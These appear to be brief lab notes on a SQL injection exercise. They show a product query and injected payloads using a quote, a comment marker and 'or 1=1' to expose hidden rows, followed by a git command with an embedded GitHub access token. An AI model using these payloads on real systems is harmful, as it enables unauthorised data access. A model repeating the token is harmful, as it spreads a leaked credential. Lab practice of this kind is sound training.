# Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
``` SELECT * FROM products WHERE category = 'Gifts' AND released = 1
 ```

 Soln--> SELECT * FROM products WHERE category = ' '  ' --+ AND released = 1

 SELECT * FROM products WHERE category = ' '  or 1=1  ' --+ AND released = 1


 git remote set-url origin https://robin113x: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@github.com/abc/WebSec.git
